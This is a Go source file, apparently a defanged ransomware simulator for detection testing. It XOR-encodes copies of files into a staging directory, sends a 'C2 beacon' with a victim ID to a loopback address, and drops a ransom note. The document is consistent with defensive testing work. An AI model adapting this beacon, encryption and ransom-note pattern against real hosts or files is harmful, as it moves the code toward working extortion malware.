package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	StagingDir  = "/tmp/abs_ransim_staging"
	XORKey      = byte(0xAB)                // Single-byte XOR key — weak, but detectable
	C2URL       = "http://127.0.0.1:9999/beacon" // Loopback C2 — won't exfil real data
	NoteContent = "Your files have been encrypted. This is a simulation. No data was harmed."
)

// xorBytes applies a single-byte XOR cipher over a byte slice
func xorBytes(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ key               // XOR every byte with the key
	}
	return out
}

// stageFile reads src, XOR-encodes it, writes to staging dir with .enc extension
func stageFile(src string) error {
	data, err := os.ReadFile(src)       // Read original file
	if err != nil {
		return err
	}
	encoded   := xorBytes(data, XORKey) // Simulate encryption
	destName  := filepath.Base(src) + ".enc"
	destPath  := filepath.Join(StagingDir, destName)
	os.MkdirAll(StagingDir, 0700)
	return os.WriteFile(destPath, encoded, 0600) // Write encoded file to staging
}

// beaconC2 sends a simulated check-in POST to the loopback C2 listener
func beaconC2(victimID string) error {
	body    := []byte(fmt.Sprintf(`{"id":"%s","ts":"%s"}`, victimID, time.Now().UTC().Format(time.RFC3339)))
	resp, err := http.Post(C2URL, "application/json", bytes.NewReader(body))
	if err != nil {
		return fmt.Errorf("c2 beacon failed: %w", err) // Wrap error with context
	}
	defer resp.Body.Close()
	fmt.Printf("[*] C2 beacon: HTTP %d\n", resp.StatusCode)
	return nil
}

// dropRansomNote writes the ransom note to the target directory
func dropRansomNote(dir string) error {
	note := filepath.Join(dir, "RANSOM_NOTE.txt")
	return os.WriteFile(note, []byte(NoteContent), 0644)
}

